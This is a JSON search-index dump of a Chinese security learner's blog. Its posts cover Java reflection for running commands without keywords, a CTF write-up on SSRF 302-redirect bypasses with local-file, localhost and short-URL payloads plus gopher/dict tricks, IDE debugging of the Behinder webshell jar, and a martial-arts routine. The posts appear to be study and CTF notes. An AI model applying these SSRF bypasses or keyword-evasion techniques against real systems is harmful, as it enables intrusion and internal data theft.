","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:2:0","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["JAVA安全"],"content":"简要分析 设置断点，开启debug，浏览器访问地址传参 可以看到str参数值已经变成whoami 且rt的值变成java.lang.Runtime 继续往下走，第22行通过forName()方法来获取到了该class对象 继续，下面第24行是通过反射获取类中方法getMethod的方式获取到getRuntime()方法 然后第27行是获取Runtime类的exec()方法 getMethod()方法 只能返回一个特定的方法，第一个参数为方法名称，第二个为方法的参数对应Class的对象 第29行， 反射通过invoke调用Runtime.getRuntime().exec(xxx)方法 命令执行完毕了 下面是通过getInputStream()使得页面回显的部分 成功输出到页面 结束 ","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:3:0","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["JAVA安全"],"content":"补充1：Java字符串转byte数组 import java.util.Arrays; public class TestByte { public static void main (String[] args) throws java.lang.Exception { //String字符串转byte数组 String nSndString=\"java.lang.Runtime.\"; byte[] tBytes=nSndString.getBytes(\"US-ASCII\"); System.out.println(Arrays.toString(tBytes)); // byte数组转字符串 String ss = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46}); System.out.println(ss); } } ","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:4:0","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["JAVA安全"],"content":"补充2：Java反射机制 可以无视类方法、变量去访问权限修饰符，并且可以调用任何类的任意方法、访问并修改成员变量值 ","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:5:0","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["JAVA安全"],"content":"基本运用 获取类对象 1.forName()方法 //使用class类中的方法调用类对象，方便，拓展性强，只要有类的名称即可 public class Test { public static void main(String[] args) throws ClassNotFoundException { //reflection // forName() Class name = Class.forName(\"java.lang.Runtime\"); System.out.println(name); } } 2.直接获取 // 直接用.class，简单，但要明确用到类中的静态成员 public class Test { public static void main(String[] args) throws ClassNotFoundException { //reflection // forName() Class\u003c?\u003e name = Runtime.class; System.out.println(name); } } 3.使用getCLass()方法 //通过Object类中的getClass()来获取字节码对象。较繁琐，必须明确具体的类，然后创建对象 public class Test { public static void main(String[] args) throws ClassNotFoundException { //reflection Runtime rt = Runtime.getRuntime(); Class\u003c?\u003e name = rt.getClass(); System.out.println(name); } } 4.使用getSystemCLassLoader().loadClass()方法 //与forName()类似，知道类名即可，但是有区别。forName()的静态方法JVM会装载类，并且执行static()中的方法 //而这个不会执行static()中的代码 获取类方法 获取某个Class对象的方法集合 1.getDeclaredMethods() // 不返回继承的方法 import java.lang.reflect.Method; public class Test { public static void main(String[] args) throws ClassNotFoundException { //reflection Class\u003c?\u003e name = Class.forName(\"java.lang.Runtime\"); Method[] ds = name.getDeclaredMethods(); for(Method d:ds) System.out.println(d); } } 2.getMethods()方法 返回某个类中所有的public方法，包括其继承类的public方法 3.getMethod()方法 只能返回一个特定的方法，第一个参数为方法名称，第二个为方法的参数对应CLass的对象 4.getDeclaredMethod()方法 和getMethod类似，只能返回一个特定的方法 获取类成员变量 1.getDeclaredFields()方法 不能获取父类的声明字段 2.getFields方法 能够获取某个类中的所有public字段，包括父类中的字段 3.getDeclaredField方法 只能获得类中的单个成员变量 4.getField方法 于getFields类似，但是只能获取某个特定的public字段，包括父类中的字段 ","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:5:1","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["渗透测试"],"content":" 今天面试问到了302SSRF，之前没了解过，发现CTFHub技能树里面有，就来记录一下学习 ","date":"2022-01-12","objectID":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/:0:0","tags":["CTF","SSRF","302SSRF"],"title":"SSRF 302跳转 Bypass","uri":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/"},{"categories":["渗透测试"],"content":"简介 302用来做临时跳转 302 表示临时性重定向，访问一个url时，被重定向到另一个url上。 302常用于页面跳转，比如未登陆的用户访问用户中心，则重定向到登录页面，访问404页面会重新定向到首页。 301适合永久重定向 301比较常用的场景是使用域名跳转。 比如，我们访问 http://www.baidu.com 会跳转到 https://www.baidu.com，发送请求之后，就会返回301状态码，然后返回一个location，提示新的地址，浏览器就会拿着这个新的地址去访问。 注意： 301请求是可以缓存的， 即通过看status code，可以发现后面写着from cache。 或者你把你的网页的名称从php修改为了html，这个过程中，也会发生永久重定向。 301重定向和302重定向的区别： 302重定向只是暂时的重定向，搜索引擎会抓取新的内容而保留旧的地址，因为服务器返回302，所以，搜索搜索引擎认为新的网址是暂时的。 而301重定向是永久的重定向，搜索引擎在抓取新的内容的同时也将旧的网址替换为了重定向之后的网址。 ","date":"2022-01-12","objectID":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/:1:0","tags":["CTF","SSRF","302SSRF"],"title":"SSRF 302跳转 Bypass","uri":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/"},{"categories":["渗透测试"],"content":"题目 题目：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧 打开题目，发现地址为：http://challenge-d3b433f06a62d54f.sandbox.ctfhub.com:10800/?url= 发现后面有过get的url参数，尝试访问：127.0.0.1/flag.php，提示“被拦截，不允许内部ip访问” 那我使用file协议获取flag其源码：?url=file:///var/www/html/flag.php 可见通过REMOTE_ADDR请求头限制本地IP请求，但是源码中并没有之前的“hacker! Ban Intranet IP”，所以查看index.php页面的源码：?url=file:///var/www/html/index.php 可以看到存在黑名单，限制了127、172、10、192网段，这里可以通过localhost的方式绕过: ?url=localhost/flag.php 也可以得到flag： 但是题目说了使用302，这里还是要学习一下这个知识点的。 使用短网址，将http://127.0.0.1/flag.php转为短网址： 利用生成的短地址构造Payload：?url=surl-2.cn/0nPI，发送请求，利用302跳转，得到flag： ","date":"2022-01-12","objectID":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/:2:0","tags":["CTF","SSRF","302SSRF"],"title":"SSRF 302跳转 Bypass","uri":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/"},{"categories":["渗透测试"],"content":"302跳转 可绕过ssrf一些利用限制 使用dict协议查看端口开放情况，当端口开放时会返回 Bad request 3 当端口未开放时：利用gopher协议反弹shell 或者限制了只能使用HTTP,HTTPS，设置跳转重定向为True（默认不跳转）即利用302跳转 短网址绕过（DNS重定向302） http://t.cn/RwbLKDx xip.io来绕过(DNS重定向302)：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意） http://xip.io 指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务) ","date":"2022-01-12","objectID":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/:3:0","tags":["CTF","SSRF","302SSRF"],"title":"SSRF 302跳转 Bypass","uri":"/ssrf-302%E8%B7%B3%E8%BD%AC-bypass/"},{"categories":["Java学习"],"content":"1.打开 File-\u003eSetting-\u003eEditor-\u003eFile Encodings，将Global Encoding、Project Encoding、Default encodeing for properties files这三项都设置成UTF-8，然后点击OK。如下图： 2.打开 Help-\u003eEdit Custom VM Options 加上下面一行： -Dfile.encoding=UTF-8 3.打开 Edit Configrations 将vm option为 -Dfile.encoding=utf-8，点击OK 4.重启IDEA ","date":"2022-01-12","objectID":"/idea%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B9%B1%E7%A0%81-tomcat%E6%97%A5%E5%BF%97%E4%B9%B1%E7%A0%81-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/:0:0","tags":["Java","日常小问题","工具"],"title":"IDEA控制台乱码(Tomcat日志乱码)解决办法","uri":"/idea%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B9%B1%E7%A0%81-tomcat%E6%97%A5%E5%BF%97%E4%B9%B1%E7%A0%81-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"},{"categories":["JAVA安全"],"content":" 初学JAVA啥也不会，从头开始学 1.新建IDEA项目 2.右键新建lib文件夹，并把jar包放进来(会自动反编译) 3.点击右上角\"Add Configurations\" 4.新建Remote，应用 5.来到原来jar包，别在项目里面反编译那个jar包目录下 命令行下执行如下命令 # 我这里以Behinder.jar为例 java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 Behinder.jar 6.然后单击IDEA的debug按钮 运行程序/如果是weblogic之类的就浏览器访问地址等方式 就可以看到程序在断点处暂停，然后就可以进行逐步调试了 ","date":"2022-01-11","objectID":"/%E4%BD%BF%E7%94%A8idea%E5%AF%B9jar%E5%8C%85%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/:0:0","tags":["Java安全","动态调试"],"title":"使用IDEA对Jar包进行动态调试","uri":"/%E4%BD%BF%E7%94%A8idea%E5%AF%B9jar%E5%8C%85%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"},{"categories":["武术"],"content":"简介 初级长拳第三路,编创于1957年。全套除了预备式和结束动作，分为四段，来回练习四趟，每段八个动作，合计三十六个动作。套路内容充实，包括了拳、掌、勾三种手型；弓、马、虚、仆、歇五种步型；手法有冲、劈、抡、砸、栽等拳法，推、挑、穿、摆、亮等掌法，盘、顶等肘法；腿法有弹、踹、踢、拍等；还有跳跃和平衡等动作。套路编排合理，由简而繁，由易到难，有利于循序渐进地进行练习；套路布局和路线变化前后呼应，左右兼顾，均匀合理；在强调动作规格化、注重功力的同时，还较好地体现了攻防意识，增强了学习的情趣。 长拳的概括和手法和眼法和步法和呼吸和发力：http://www.6okok.com/quanfa/changquan/4209.html ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:1:0","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"动作分解 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:0","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"预备势 两脚并步站立，两臂垂于身体两侧，五指并拢贴靠腿外侧，眼向前平视 (图一)。 要点：头要端正，颏微收，挺胸，塌腰，收腹。 一、虚步亮掌 ①右脚向右后方撤步成左弓步。右掌向右、向上、向前划弧，掌心向上；左臂屈肘，左掌提至腰侧，掌心向上。目视右掌 (图二之1)。 ②右腿微屈，重心后移。左掌经胸前从右臂上向前穿出伸直；右臂屈肘，右掌收至腰侧，掌心向上。目视左掌 (图二之2)。 ③重心继续后移，左脚稍向右移，脚尖点地，成左虚步。左臂内旋向左、向后划孤成勾手，勾尖向上；右手继续向后、向右、向前上划孤，屈肘抖腕，在头葡上方成亮掌 (即横掌)，掌心向前，掌指向左。目视左方 (图二之3)。 要点：三个动作必须连贯。成虚步时， 重心落于右腿上，右大腿与地面平行。左腿微屈，脚尖点地。 二、并步对拳 ①右腿蹬直，左腿提膝，脚尖里扣，上肢姿势不变 (图三之1)。 ②左脚向前落步，重心前移。左臂屈肘，左勾手变掌经左肋前伸；右臂外旋向前下落于左掌右侧，两掌同高，掌心均向上 (图三之2)。 ③右脚向前上一步，两臂下垂后摆 (图三之3)。 ④左脚向右脚并步，两臂向外向上经胸前屈肘下按，两掌变拳，拳心向下，停于小腹前。目视左侧(图三之4)。 要点：并步后挺胸、塌腰。对拳、并步、转头要同时完成。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:1","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"第一节 一、弓步冲拳 ①左脚向左上一步，脚尖向斜前方；右腿微屈，成半马步。左臂向上向左格打，拳眼向后，拳与肩同高；右拳收至腰侧，拳心向上。目视左拳(图四之1)。 ②右腿蹬直成左弓步。左拳收至腰侧，拳心向上，右拳向前冲出，高与肩平，拳眼向上。目视右拳 (图四之2)。 要点：成弓步时，右腿充分蹬直，脚跟不要离地。冲拳时，尽量转腰顺肩。 二、弹踢冲拳 ①重心前移至左腿，右腿屈膝提起，脚面绷直，猛力向前弹出伸直，高与腰平。右拳收至腰侧；左拳向前冲出。目视前方 (图五)。 要点：支撑腿可微屈，弹出的腿要用爆发力，力点达于脚尖。 三、马步冲拳 右脚向前落步，脚尖里扣，上体左转。左拳收至腰侧，两腿下蹲成马步；右拳向前冲出。目视右拳 (图六)。 要点：成马步时，大腿要平，两脚平行，脚跟外蹬，挺胸、塌腰。 四、弓步冲拳 ①上体右转90°，右脚尖外撇向斜前方，成半马步。右臂屈肘向右格打，拳眼向后。目视右拳 (图七之1)。 ②左腿蹬直成右弓步。右拳收至腰侧；左拳向前冲出。目视左拳 (图七之2)。 要点：与本节的弓步冲拳相同，惟左右相反。 五、弹腿冲拳 重心前移至右腿，左腿屈膝提起，脚面绷直，猛力向前弹出伸直，高与腰平。左拳收至腰侧，右拳向前冲出。目视前方 (图八)。 要点：与本节的弹腿冲拳相同。 六、大跃步前穿 ①左腿屈膝。右拳变掌内旋，以手背向下挂至左膝外侧，上体前倾。目视右手 (图九之1)。 ②左脚向前落步，两腿微屈。右掌继续向后挂，左拳变掌，向后向下伸直。目视右掌(图九之2)。 ③右腿屈膝向前提起，左腿立即猛力蹬地向前跃出。两掌向前向上划孤摆起。目视左掌 (图九之3)。 ④右腿落地全蹲，左腿随即落地向前铲出成仆步。右掌变拳抱于腰侧，左掌由上向右向下划弧成立掌，停于右胸前。目视左脚 (图九之4)。 要点：跃步要远，落地要轻，落地后立即接做下一个动作。 七、弓步击掌 ①右腿猛力蹬直成左弓步。左掌经左脚面向后划弧至身后成勾手，左臂伸直，勾尖向上，右拳由腰侧变掌向前推出，掌指向上，掌外侧向前，目视右掌 (图十)。 八、马步架掌 ①重心移至两腿中间，左脚脚尖里扣成马步，上体右转。右臂向左侧平摆，稍屈肘；同时左勾手变掌由后经左腰侧从右臂内向前上穿出，掌心均朝上。目视左手 (图十一之1)。 ②右掌立于左胸前；左臂向左上屈肘抖腕亮掌于头部左上方，掌心向前。目右转视 (图十一之2)。 要点：马步同前。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:2","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"第二节 一、虚步栽拳 ①右脚蹬地，屈膝提起；左腿伸直，以前脚掌为轴向右后转体180°。右掌由左胸前向下经右腿外侧向后划孤成勾手；左臂随体转动并外旋，使掌心朝右。目视右手 (图十二之1)。 ②右脚向右落地，重心移至右腿上，下蹲成左虚步。左掌变拳下落于左膝上，拳眼向里，拳心向后；右勾手变拳，屈肘向上架于头右上方，拳心向前。目视左方 (图十二之2)。 二、提膝穿掌 ①右腿稍伸直。右拳变掌收至腰侧、掌心向上，左拳变掌由下向左向上划弧盖压于头上方，掌心向前（图十三之1）。 ②右腿蹬直，左腿屈膝提起，脚尖内扣。右掌从腰侧经左臂内向右前上方穿出，掌心向上，左掌收至右胸前成立掌。目视右掌 (图十三之2)。 要点：支撑腿与右臂充分伸直。 三、仆步穿掌 右腿全蹲，左腿向左后方铲出成左仆步。右臂不动，左掌由右胸前向下经左腿内侧，向左 脚面穿出。目随左掌转视 (图十四)。 四、虚步挑掌 ①右腿蹬直，重心前移至左腿，成左弓步。右掌稍下降，左掌随重心前移向前挑起 (图十五之1)。 ②右脚向左前方上步，左腿半蹲，成右虚步。身体随上步左转180°。在右脚上步的同时，左掌由前向上向后划弧成立掌，右掌由后向下向前上挑起成立掌，指尖与眼平。目视右掌（图十五之2）。 要点：上步要快，虚步要稳。 五、马步击掌 ①右脚落实，脚尖外撇，重心稍升高并右移，左掌变拳收至腰侧；右掌俯掌向外掳手 (图十六之1)。 ②左脚向前上一步，以右脚为轴向右后转体180°，两腿下蹲成马步。左掌从右臂上成立掌向左侧击出；右掌变拳收至腰侧。目视左掌 (图十六之2)。 要点：右手做掳手时，先使臂稍内旋、腕伸直，手掌向下向外转，接着臂外旋，掌心经下向上翻转，同时抓握成拳。收拳和击掌动作要同时进行。 六、叉步双摆掌 ①重心稍右移，同时两掌向下向右摆，掌指均向上。目视右掌 (图十七之1)。 ②右脚向左腿后插步，前脚掌着地。两臂继续由右向上向左摆，停于身体左侧，均成立掌，右掌停于左肘窝处。目随双掌转视 (图十七之2)。 要点：两臂要划立圆，幅度要大，摆掌与后插步配合一致。 七、弓步击掌 ①两腿不动。左掌收至腰侧，掌心向上；右掌向上向右划孤，掌心向下 (图十八之1)。 ②左腿后撤一步，成右弓步。右掌向下向后伸直摆动，成勾手，勾尖向上；左掌成立掌向前推出。目视左掌 (图十八之2)。 八、转身踢腿 马步盘肘 ①两脚以前脚掌为轴向左后转体180°。在转体的同时，左臂向上向前划半立圆，右臂向下向后划半圆（图十九之1）。 ②上动不停，两脚不动，右臂由后向上向前划半立圆，左臂由前向下向后划半立圆 (图十九之2)。 ③上动不停，右劈向下成反臂勾手，勾尖向上；左臂向上成亮掌，掌心向前上方。右腿伸直，脚尖勾起，向额前踢 (图十九之3)。 ④右脚向前落地，脚尖里扣。右手不动，左臂屈肘下落至胸前，左掌心向下。目视左掌 (图十九之4)。 ⑤上体左转90°，两腿下蹲成马步。同时左掌向前向左平掳变拳收至腰侧，右勾手变拳，右臂伸直，由体后向右向前平摆，至体前时屈肘，肘尖向前，高与肩平，拳心向下。目视肘尖（图十九之5）。 要点：两臂抡动时要划立圆，动作连贯。盘肘时要快速有力，右肩前顺。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:3","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"第三节 一、歇步抡砸拳 ①重心稍升高，右脚尖外撇。右臂由胸前向上向右抡直；左拳向下向左，使臂抡直。目视右拳 (图二十之1)。 ②上动不停，两脚以前脚掌为轴，向右后转体180°。右臂向下向后抡摆，左臂向上向前随身体转动 (图二十之2)。 ③紧接上动，两腿全蹲成歇步。左臂随身体下蹲向下平砸，拳心向上，臂部微屈；右臂伸直向上举起。目视左拳 (图二十之3)。 要点：抡臂动作要连贯完成，划成立圆。歇步要两腿交叉全蹲，左腿大、小腿靠紧，臀部贴于左小腿外侧，膝关节在右小腿外侧，脚跟提起，右脚尖外撇，全脚着地。 二、仆步亮拳 ①左脚由右腿后抽出前上一步，左腿蹬直，右腿半蹲，成右弓步。上体微向右转。左拳收至腰侧，右拳变掌向下经胸前向右横击掌。目视右掌(图二十一之1)。 ②右脚蹬地屈膝提起，上体右转。左拳变掌从右掌上向前穿出，掌心向上，右掌平收至左肘下 (图二十一之2)。 ③右脚向右落步，屈膝全蹲，左腿伸直，成仆步。左掌向下向后划弧成勾手，勾尖向上，右掌向右向上划弧微屈，抖腕成亮掌，掌心向前。头随右手转动，至亮掌时，目视左方 (图二十一之3)。 要点：仆步时，左腿充分伸直，脚尖里扣，右腿全蹲，两脚脚掌全部着地。上体挺胸塌腰，稍左转。 三、弓步劈拳 ①右腿蹬地立起；左腿收回并向左前方上步。右掌变拳收至腰侧，左勾手变掌由下向前上经胸前向左做掳手(图二十二之1)。 ②右腿经左腿前方向左绕上一步，左腿蹬直成右弓步。左手向左平掳后再向前挥摆，虎口朝前 (图二十二之2)。 ③在左手平掳的同时，右拳向后平摆，然后再向前向上做抡劈拳，拳高与耳平，拳心向上，左掌外旋接扶右前臂。目视右拳 (图二十二之3)。 要点：左右脚上步稍带孤形。 四、换跳步 弓步冲拳 ①重心后移，右脚稍向后移动。右拳变掌臂内旋以掌背向下划弧挂至右膝内侧；左掌背贴靠右肘外侧，掌指向前。目视右掌 (图二十三之1)。 ②右腿自然上抬，上体稍向左扭转。右掌挂至体左侧，左掌伸向右腋下。目随右掌转视 (图二十三之2)。 ③右脚以全脚掌用力向下震跺，与此同时，左脚急速离地抬起。右手由左向上向前掳盖而后变拳收至腰侧，左掌伸直向下、向上、向前屈肘下按，掌心向下。上体右转，目视左掌 (图二十三之3)。 ④左脚向前落步，右腿蹬直成左弓步。右拳向前冲出，拳高与肩平；左掌藏于右腋下，掌背贴靠腋窝。目视右拳 (图二十三之4)。 要点：换跳步动作要连贯、协调。震脚时腿要弯屈，全脚掌着地，左脚离地不要高。 五、马步冲拳 上体右转90°，重心移至两腿中间，成马步。右拳收至腰侧，左掌变拳向左冲出，拳眼向上。目视左拳(图二十四)。 六、弓步下冲掌 右脚蹬直，左腿弯屈，上体稍向左转，成左弓步。左拳变掌向下经体前向上架于头左上方，掌心向上，右拳自腰侧向左前斜下方冲出。目视右拳 (图二十五)。 七、叉步亮掌侧踹腿 ①上体稍右转。左掌由头上下落于右手碗上，右拳变掌，两手交叉成十字。目视双手 (图二十六之1)。 ②右脚蹬地并向左腿后插步，以前脚掌着地。左掌由体前向下向后划弧成勾手，勾尖向上，右掌由前向右向上划弧抖腕亮掌，掌心向前。目视左侧(图二十六之2)。 ③重心移至右腿，左腿屈膝提起，向左上方猛力蹬出。上肢姿势不变，目视左侧 (图二十六之3)。 要点：插步时上体稍向右倾斜，腿、臂的动作要一致。侧踹高度不能低于腰，大腿内旋，着力点在脚跟。 八、虚步挑掌 ①左脚在左侧落地。右掌变拳稍后移，左勾手变拳由体后向左上挑，拳背向上 (图二十七之1)。 ②上体左转180°，微含胸前俯。左拳继续向前向上划弧上挑，右拳向下向前划孤挂至右膝外侧，同时右膝提起。目视右拳 (图二十七之2)。 ③右脚向左前方上步，脚尖点地，重心落于左脚，左腿下蹲成右虚步。左拳向后划弧收至腰侧，拳心向上，右拳向前屈臂挑出，拳眼斜向上，拳与肩同高。目视右拳 (图二十七之3)。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:4","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"第四节 一、弓步顶肘 ①重心升高，右脚踏实。右臂内旋向下直臂划弧以拳背下挂至右膝内侧，左拳不变。目视前下方 (图二十八之1)。 ②左腿蹬直，右腿屈膝上抬。左拳变掌，右拳不变，两臂向前向上划弧摆起。目随右拳转视 (图二十八之2)。 ③左脚蹲地起跳，身体腾空，两臂继续划弧至头上方 (图二十八之3)。 ④右脚先落地，右腿屈膝，左脚向前落步，以前脚掌着地。同时两臂向右向下屈肘停于右胸前，右拳变掌，左掌变拳。右掌心贴靠左拳面(图二十八之4)。 ⑤左脚向左上一步，左腿屈膝，右腿蹬直成左弓步。右掌推左拳，以左肘尖向左顶出，高与肩平。目视前方(图二十八之5)。 要点：交换步时不要过高，但要快。两臂抡摆时要成圆弧。 二、转身左拍脚 ①以两脚前脚掌为轴向右后转体180°。随着转体，右臂向上、向右向下划弧抡摆，同时左拳变掌向下向后向前上抡摆 (图二十九之1)。 ②左腿伸直向前上踢起，脚面绷平。左掌变拳收至腰侧，右掌由体后向上向前拍击左脚面（图二十九之2）。 要点：右掌拍脚时手掌稍横过来，拍脚要准而响亮。 三、右拍脚 ①左脚向前落地，左拳变掌向下向后摆，右掌变拳收至腰侧 (图三十之1)。 ②右腿伸直向前上踢起，脚面绷平。左拳变掌由后向上向前拍击右脚面 (图三十之2)。 要点：与本节的转身左拍脚相同。 四、腾空飞脚 ①右脚落地(图三十一之1)。 ②左脚向前摆起，右脚猛力蹬地跳起，左腿屈膝继续前上摆。同时右拳变掌向前向上摆起，左掌先上摆而后下降拍击右掌背 (图三十一之2)。 ③右腿继续上摆，脚面绷平。右手拍击右脚面，左掌由体前向后上举(图三十一之3)。 要点：蹬地要向上，不要太向前冲，左膝尽量上提。击响要在腾空时完成，右臂伸直成水平。 五、歇步下冲拳 ①左、右脚先后相继落地。左掌变拳收至腰侧 (图三十二之1)。 ②身体右转90°，两腿全蹲成歇步。右掌抓握、外旋变拳收至腰侧；左拳由腰侧向前下方冲出，拳心向下。目视左拳 (图三十二之2)。 六、仆步抡劈拳 ①重心升高，右臂由腰侧向体后伸直，左臂随身体重心升高向上摆起(图三十三之1)。 ②以右脚前脚掌为轴，左腿屈膝提起，上体左转270°。左拳由前向后下划立圆一周；右拳由后向下向前上划立圆一周 (图三十三之2)。 ③左腿向后落一步，屈膝全蹲，右腿伸直，脚尖里扣成右仆步。右拳由上向下抡劈，拳眼向上；左拳后上举，拳眼向上。目视右拳 (图三十三之3)。 要点：抡臂时一定要划立圆。 七、提膝挑掌 ①重心前移成右弓步。同时右拳变掌由下向上抡摆，左拳变掌稍下落，右掌心向左，左掌心向右 (图三十四之1)。 ②左、右臂在垂直面上由前向后各划立圆一周。右臂伸直停于头上，掌心向左，掌指向上，左臂伸直停于身后成反勾手。同时右腿屈膝提起，左腿挺膝伸直独立。目视前方 (图三十四之2)。 要点：抡臂时要划立圆。 八、提膝劈掌弓步冲拳 ①下肢不动。右掌由上向下猛劈伸直，停于右小腿内侧，用力点在小指一侧；左勾手变掌，屈臂向前停于右上臂内侧，掌心向左。目视右掌(图三十五之1)。 ②右脚向右后落地；身体右转90°。同时左掌变拳收至腰侧，右臂内旋向右划弧做劈掌 (图三十五之2)。 ③上动不停，左腿蹬直成右弓步。右手抓握变拳收至腰侧，左拳由腰侧向左前方冲出。目视左拳 (图三十五之3)。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:5","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"结束动作 一、虚步亮掌 ①右脚扣于左膝后，两拳变掌，两臂右上左下屈肘交叉于体左前。目视右掌 (图三十六之1)。 ②右脚向右后落步，重心后移，右腿半蹲，上体稍右转。同时右掌向上、向右、向下划弧停于左腋下；左掌向左、向上划弧停于右臂上与左胸前，两掌心左下右上。目视左掌 (图三十六之2)。 ③左脚尖稍向右移，右腿下蹲成左虚步。左臂伸直向左、向后划弧成反勾手；右臂伸直向下、向右、向上划弧抖腕亮掌，掌心向前。目视左方(图三十六之3)。 二、并步对掌 ①左腿后撤一步，同时两掌从两腰侧向前穿出伸直，掌心向上 (图三十七之1)。 ②右腿后撤一步，同时两臂分别向体后下摆 (图三十七之2)。 ③左脚后退半步向右脚并拢。两臂由后向上经体前屈臂下按，两掌变拳，停于腹前，拳心向下，拳面相对。目视左方 (图三十七之3)。 还原 两臂自然下垂，目视正前方 (图三十八)。 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:2:6","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"视频 您的浏览器不支持 video 标签。 由于懒，所以参考：http://www.6okok.com/quanfa/changquan/4208.html，感谢该网站的辛苦整理 ","date":"2022-01-11","objectID":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/:3:0","tags":["三路长拳"],"title":"三路拳","uri":"/%E4%B8%89%E8%B7%AF%E6%8B%B3/"},{"categories":["武术"],"content":"简介 